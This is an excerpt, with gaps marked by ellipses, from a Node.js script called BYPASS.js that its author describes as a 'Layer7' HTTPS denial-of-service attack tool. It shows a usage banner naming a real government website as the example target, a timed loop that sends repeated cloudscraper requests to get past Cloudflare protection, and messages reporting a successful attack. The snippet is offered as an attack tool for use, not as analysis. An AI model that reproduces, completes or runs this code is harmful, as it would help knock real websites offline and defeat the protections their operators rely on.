...
if (process.argv.length <= 2) {
  console.clear();
  console.log(gradient.teen("[Unknownme69] > node BYPASS.js [URL] [TIME]"));
  console.log(
    gradient.teen(
      "[Unknownme69] example: node BYPASS.js https://indonesia.go.id/ 300"
    )
  );
  console.log(
    gradient.teen(
      "[Unknownme69] BYPASS.js are Layer7 Attacks using HTTPS-BYPASS was Created by Unknownme69."
    )
  );
  process.exit(-1);
}
...
console.log(
  gradient.teen(
    "[Unknownme69] Success attack to " + url + " | Duration: " + time + "!"
  )
);
console.log(
  gradient.teen(
...
var int = setInterval(() => {
  ...
  cloudscraper.get(url, function (error, response, body) {
    if (error) {
      console.log(gradient.teen(`[Unknownme69] > Connection Timedout!`));
    } else {
